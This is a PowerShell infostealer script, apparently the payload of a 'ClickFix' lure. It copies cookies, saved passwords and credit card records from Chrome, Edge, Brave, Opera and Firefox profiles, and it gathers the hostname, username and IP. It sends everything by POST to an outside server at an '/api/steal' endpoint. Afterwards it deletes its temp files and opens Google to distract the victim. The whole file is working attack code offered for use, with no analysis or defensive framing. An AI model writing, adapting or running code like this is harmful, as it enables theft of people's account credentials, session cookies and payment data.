# ============================================================
# BROWSER STEALER — ALL BROWSERS
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

# ---- System Info ----
$system = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

# ---- Get IP ----
try {
    $ip = (Invoke-WebRequest -Uri "http://ip-api.com/json/" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
    $system.ip = $ip
} catch {}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-ChromeCookies {
    $cookies = @()
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\chrome_cookies.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cookies += @{
                    domain = $reader.GetString(0)
                    name = $reader.GetString(1)
                    value = $reader.GetString(2)
                    path = $reader.GetString(3)
                    expires = $reader.GetInt64(4)
                    secure = $reader.GetBoolean(5)
                    httponly = $reader.GetBoolean(6)
                    browser = "Chrome"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cookies
}

function Get-EdgeCookies {
    $cookies = @()
    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\edge_cookies.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cookies += @{
                    domain = $reader.GetString(0)
                    name = $reader.GetString(1)
                    value = $reader.GetString(2)
                    path = $reader.GetString(3)
                    expires = $reader.GetInt64(4)
                    secure = $reader.GetBoolean(5)
                    httponly = $reader.GetBoolean(6)
                    browser = "Edge"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cookies
}

function Get-BraveCookies {
    $cookies = @()
    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\brave_cookies.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cookies += @{
                    domain = $reader.GetString(0)
                    name = $reader.GetString(1)
                    value = $reader.GetString(2)
                    path = $reader.GetString(3)
                    expires = $reader.GetInt64(4)
                    secure = $reader.GetBoolean(5)
                    httponly = $reader.GetBoolean(6)
                    browser = "Brave"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cookies
}

function Get-OperaCookies {
    $cookies = @()
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\opera_cookies.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cookies += @{
                    domain = $reader.GetString(0)
                    name = $reader.GetString(1)
                    value = $reader.GetString(2)
                    path = $reader.GetString(3)
                    expires = $reader.GetInt64(4)
                    secure = $reader.GetBoolean(5)
                    httponly = $reader.GetBoolean(6)
                    browser = "Opera"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookiesFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookiesFile) {
                try {
                    $temp = "$env:TEMP\firefox_cookies.tmp"
                    Copy-Item $cookiesFile $temp -Force
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $cookies += @{
                            domain = $reader.GetString(0)
                            name = $reader.GetString(1)
                            value = $reader.GetString(2)
                            path = $reader.GetString(3)
                            expires = $reader.GetInt64(4)
                            secure = $reader.GetBoolean(5)
                            httponly = $reader.GetBoolean(6)
                            browser = "Firefox"
                        }
                    }
                    $conn.Close()
                    Remove-Item $temp -Force
                } catch {}
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    $passwords = @()
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\chrome_passwords.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $passwords += @{
                    url = $reader.GetString(0)
                    username = $reader.GetString(1)
                    password = $reader.GetString(2)
                    browser = "Chrome"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $passwords
}

function Get-EdgePasswords {
    $passwords = @()
    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\edge_passwords.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $passwords += @{
                    url = $reader.GetString(0)
                    username = $reader.GetString(1)
                    password = $reader.GetString(2)
                    browser = "Edge"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $passwords
}

function Get-BravePasswords {
    $passwords = @()
    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\brave_passwords.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $passwords += @{
                    url = $reader.GetString(0)
                    username = $reader.GetString(1)
                    password = $reader.GetString(2)
                    browser = "Brave"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $passwords
}

function Get-OperaPasswords {
    $passwords = @()
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\opera_passwords.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $passwords += @{
                    url = $reader.GetString(0)
                    username = $reader.GetString(1)
                    password = $reader.GetString(2)
                    browser = "Opera"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    foreach ($login in $content.logins) {
                        $passwords += @{
                            url = $login.hostname
                            username = $login.username
                            password = $login.password
                            browser = "Firefox"
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    $cards = @()
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\chrome_cards.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cards += @{
                    name = $reader.GetString(0)
                    number = $reader.GetString(1)
                    month = $reader.GetInt32(2)
                    year = $reader.GetInt32(3)
                    browser = "Chrome"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cards
}

function Get-EdgeCards {
    $cards = @()
    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\edge_cards.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cards += @{
                    name = $reader.GetString(0)
                    number = $reader.GetString(1)
                    month = $reader.GetInt32(2)
                    year = $reader.GetInt32(3)
                    browser = "Edge"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cards
}

function Get-BraveCards {
    $cards = @()
    $path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
    if (Test-Path $path) {
        try {
            $temp = "$env:TEMP\brave_cards.tmp"
            Copy-Item $path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $cards += @{
                    name = $reader.GetString(0)
                    number = $reader.GetString(1)
                    month = $reader.GetInt32(2)
                    year = $reader.GetInt32(3)
                    browser = "Brave"
                }
            }
            $conn.Close()
            Remove-Item $temp -Force
        } catch {}
    }
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

Write-Host "[+] Stealing from ALL browsers..."

$allCookies = @()
$allCookies += Get-ChromeCookies
$allCookies += Get-EdgeCookies
$allCookies += Get-BraveCookies
$allCookies += Get-OperaCookies
$allCookies += Get-FirefoxCookies

$allPasswords = @()
$allPasswords += Get-ChromePasswords
$allPasswords += Get-EdgePasswords
$allPasswords += Get-BravePasswords
$allPasswords += Get-OperaPasswords
$allPasswords += Get-FirefoxPasswords

$allCards = @()
$allCards += Get-ChromeCards
$allCards += Get-EdgeCards
$allCards += Get-BraveCards

Write-Host "[+] Cookies: $($allCookies.Count)"
Write-Host "[+] Passwords: $($allPasswords.Count)"
Write-Host "[+] Credit Cards: $($allCards.Count)"

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = $system
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

# ---- Send to server ----
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Host "[+] Data sent"
} catch {
    Write-Host "[!] Failed to send: $_"
}

# ---- Cleanup ----
Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue

# ---- Distraction ----
Start-Process "https://www.google.com"

Write-Host "[+] Done"
